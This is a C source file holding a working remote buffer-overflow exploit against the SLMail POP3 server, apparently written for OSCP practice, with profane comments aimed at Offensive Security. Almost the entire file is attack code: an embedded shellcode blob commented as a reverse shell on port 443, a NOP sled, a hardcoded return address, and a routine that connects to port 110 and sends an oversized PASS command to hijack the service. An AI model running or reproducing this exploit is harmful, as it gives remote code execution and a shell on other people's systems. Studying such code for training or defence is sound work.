1.
/*
Ivan Ivanovic Ivanov made the Poc, Offensive-Security fucked it up, and I fixed it.
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] reverse 443
unsigned char shellcode[] = 
"\xb8\x39\xb1\xa5\x65\xda\xc1\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x83\xc7\x04\x31\x47\x0e\x03\x7e\xbf\x47\x90\x7c\x57\x05"
"\x5b\x7c\xa8\x6a\xd5\x99\x99\xaa\x81\xea\x8a\x1a\xc1\xbe\x26"
"\xd0\x87\x2a\xbc\x94\x0f\x5d\x75\x12\x76\x50\x86\x0f\x4a\xf3"
"\x04\x52\x9f\xd3\x35\x9d\xd2\x12\x71\xc0\x1f\x46\x2a\x8e\xb2"
"\x76\x5f\xda\x0e\xfd\x13\xca\x16\xe2\xe4\xed\x37\xb5\x7f\xb4"
"\x97\x34\x53\xcc\x91\x2e\xb0\xe9\x68\xc5\x02\x85\x6a\x0f\x5b"
"\x66\xc0\x6e\x53\x95\x18\xb7\x54\x46\x6f\xc1\xa6\xfb\x68\x16"
"\xd4\x27\xfc\x8c\x7e\xa3\xa6\x68\x7e\x60\x30\xfb\x8c\xcd\x36"
"\xa3\x90\xd0\x9b\xd8\xad\x59\x1a\x0e\x24\x19\x39\x8a\x6c\xf9"
"\x20\x8b\xc8\xac\x5d\xcb\xb2\x11\xf8\x80\x5f\x45\x71\xcb\x37"
"\xaa\xb8\xf3\xc7\xa4\xcb\x80\xf5\x6b\x60\x0e\xb6\xe4\xae\xc9"
"\xb9\xde\x17\x45\x44\xe1\x67\x4c\x83\xb5\x37\xe6\x22\xb6\xd3"
"\xf6\xcb\x63\x73\xa6\x63\xdc\x34\x16\xc4\x8c\xdc\x7c\xcb\xf3"
"\xfd\x7f\x01\x9c\x94\x7a\xc2\xa9\x63\x84\x5b\xc6\x71\x84\x5a"
"\xad\xff\x62\x36\xc1\xa9\x3d\xaf\x78\xf0\xb5\x4e\x84\x2e\xb0"
"\x51\x0e\xdd\x45\x1f\xe7\xa8\x55\xc8\x07\xe7\x07\x5f\x17\xdd"
"\x2f\x03\x8a\xba\xaf\x4a\xb7\x14\xf8\x1b\x09\x6d\x6c\xb6\x30"
"\xc7\x92\x4b\xa4\x20\x16\x90\x15\xae\x97\x55\x21\x94\x87\xa3"
"\xaa\x90\xf3\x7b\xfd\x4e\xad\x3d\x57\x21\x07\x94\x04\xeb\xcf"
"\x61\x67\x2c\x89\x6d\xa2\xda\x75\xdf\x1b\x9b\x8a\xd0\xcb\x2b"
"\xf3\x0c\x6c\xd3\x2e\x95\x9c\x9e\x72\xbc\x34\x47\xe7\xfc\x58"
"\x78\xd2\xc3\x64\xfb\xd6\xbb\x92\xe3\x93\xbe\xdf\xa3\x48\xb3"
"\x70\x46\x6e\x60\x70\x43";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER morty\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = &evil;
      ptr = ptr + 652; // 2606 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 351);
      *(long*)&evil[2606] = 0x5f4a358f; // OSCP ready

      // zeeee banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // zeeee sexy user
      printf("[+] Sending Stupid Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // the worthless passwd...
      printf("[+] Sending Sexy buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! I hope your reverse shell was up...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] OSCP FRUSTRATION AND FEAR!\n");
    printf("[$] by offensive-security pricks!\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
